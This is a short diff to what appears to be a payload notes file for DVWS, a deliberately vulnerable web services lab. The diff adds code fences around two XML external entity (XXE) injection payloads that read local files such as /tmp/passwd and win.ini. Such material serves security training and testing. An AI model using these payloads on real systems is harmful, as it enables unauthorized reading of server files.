@@ -21,13 +21,14 @@ URL : /dvws/vulnerabilities/xxe/
 
 [XXE]
 
+```
 name=<?xml version="1.0"?>
 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///tmp/passwd">]>
 <test>&xxe;</test>
- 
- 
+ ```
+ ```
 name=<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>
-
+```
 
 ### XPATH Injection
 URL: /dvws/vulnerabilities/xpath/xpath.php 
